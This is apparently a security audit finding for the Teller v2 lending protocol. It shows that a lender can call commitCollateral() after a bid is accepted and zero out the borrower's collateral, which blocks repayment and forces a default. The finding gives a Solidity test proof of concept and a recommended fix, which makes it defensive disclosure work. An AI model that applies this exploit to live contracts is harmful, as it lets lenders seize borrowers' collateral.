# Original link
https://github.com/sherlock-audit/2023-03-teller-judging/issues/158
0xbepresent

high

# Malicious lender can block borrower repayment causing the borrower default

## Summary

The malicious lender can block the borrower repayment causing the borrower default.

## Vulnerability Detail

Once the borrow is accepted and the collateral is deposited to the escrow contract, the lender can call the [commitCollateral()](https://github.com/sherlock-audit/2023-03-teller/blob/main/teller-protocol-v2/packages/contracts/contracts/CollateralManager.sol#L117) function modifying the bid's collateral availabe to zero causing that the borrower could not repay the full loan because the withdraw function will be reverted.

I created a test where the borrower repay is reverted because the malicious lender modify the available collateral via the commitCollateral() function. Test steps:

1. Create the collateral bid and lender accept it.
2. Assert the escrow has the borrower's collateral.
3. The malicious lender commits Zero amount to the borrower's collateral via the [collateralManager.commitCollateral()](https://github.com/sherlock-audit/2023-03-teller/blob/main/teller-protocol-v2/packages/contracts/contracts/CollateralManager.sol#L138) function
4. The borrower's repayment is reverted by an ```Withdraw amount cannot be zero``` error. The borrower try to repay the loan but is unable to paid because the collateral amount was set by malicious lender to zero so the transaction is reverted

```solidity
File: TellerV2_Test.sol
399:     function test_MaliciousLenderCanBlockBorrowerRepayments() public {
400:         // The malicious lender can block the borrower repayments causing the borrower to default.
401:         // 1. Create the collateral bid and lender accept it
402:         // 2. Assert the escrow has the borrower's collateral
403:         // 3. The malicious lender commits Zero amount to the borrower's collateral via the collateralManager.commitCollateral() function
404:         // 4. The borrower's repayment is reverted by an "Withdraw amount cannot be zero" error.
405:         //    The borrower try to repay the loan but is unable to paid because the collateral amount
406:         //    was set by malicious lender to zero so the transaction is reverted
407:         //
408:         //
409:         // 1. Create the collateral bid and lender accept it
410:         //
411:         // Submit bid as borrower
412:         uint256 bidId = submitCollateralBid();
413:         // Accept bid as lender
414:         acceptBid(bidId);
415:         //
416:         // 2. Assert the escrow has the borrower's collateral
417:         //
418:         // Get newly created escrow and test the creates escrow has the same bidId and collateral stored
419:         address escrowAddress = collateralManager._escrows(bidId);
420:         CollateralEscrowV1 escrow = CollateralEscrowV1(escrowAddress);
421:         uint256 storedBidId = escrow.getBid();
422:         assertEq(bidId, storedBidId, "Collateral escrow was not created");
423:         uint256 escrowBalance = wethMock.balanceOf(escrowAddress);
424:         assertEq(collateralAmount, escrowBalance, "Collateral was not stored");
425:         //
426:         // 3. The malicious lender commits Zero amount to the borrower's colletaral via the collateralManager.commitCollateral() function
427:         //
428:         Collateral memory maliciousInfo;
429:         maliciousInfo._amount = 0;
430:         maliciousInfo._tokenId = 0;
431:         maliciousInfo._collateralType = CollateralType.ERC20;
432:         maliciousInfo._collateralAddress = address(wethMock);
433:         collateralManager.commitCollateral(bidId, maliciousInfo);
434:         //
435:         // 4. The borrower's repayment is reverted by an "Withdraw amount cannot be zero" error.
436:         //    The borrower try to repay the loan but is unable to paid because the collateral amount
437:         //    was set by malicious lender to zero so the transaction is reverted
438:         //
439:         Payment memory amountOwed = tellerV2.calculateAmountOwed(bidId);
440:         borrower.addAllowance(
441:             address(daiMock),
442:             address(tellerV2),
443:             amountOwed.principal + amountOwed.interest
444:         );
445:         vm.expectRevert(bytes("Withdraw amount cannot be zero"));
446:         borrower.repayLoanFull(bidId);
447:     }
```

## Impact

The borrower can not repaid his loan causing the borrower default and the lender can claim the collateral.

## Code Snippet

Here the [commitCollateral()](https://github.com/sherlock-audit/2023-03-teller/blob/main/teller-protocol-v2/packages/contracts/contracts/CollateralManager.sol#L117) function the collateral amount can be modified by malicious lender to zero amount in the collateral addresses.

```solidity
File: CollateralManager.sol
117:     function commitCollateral(
118:         uint256 _bidId,
119:         Collateral[] calldata _collateralInfo
120:     ) public returns (bool validation_) {
121:         address borrower = tellerV2.getLoanBorrower(_bidId);
122:         (validation_, ) = checkBalances(borrower, _collateralInfo);
123: 
124:         if (validation_) {
125:             for (uint256 i; i < _collateralInfo.length; i++) {
126:                 Collateral memory info = _collateralInfo[i];
127:                 _commitCollateral(_bidId, info);
128:             }
129:         }
130:     }
```

Then, when the execution path tries to [withdraw()](https://github.com/sherlock-audit/2023-03-teller/blob/main/teller-protocol-v2/packages/contracts/contracts/CollateralManager.sol#L250) the collateral from the escrow contract and the transaction will be [reverted by amount zero error](https://github.com/sherlock-audit/2023-03-teller/blob/main/teller-protocol-v2/packages/contracts/contracts/escrow/CollateralEscrowV1.sol#L89) in the code line 89.

```solidity
File: CollateralEscrowV1.sol
84:     function withdraw(
85:         address _collateralAddress,
86:         uint256 _amount,
87:         address _recipient
88:     ) external virtual onlyOwner {
89:         require(_amount > 0, "Withdraw amount cannot be zero");
```

## Tool used

Manual review

## Recommendation

Since the liquidations criteria is based on the expiration cycles, the code must not allow modifications to the collateral after the bid was accepted.

Duplicate of #169
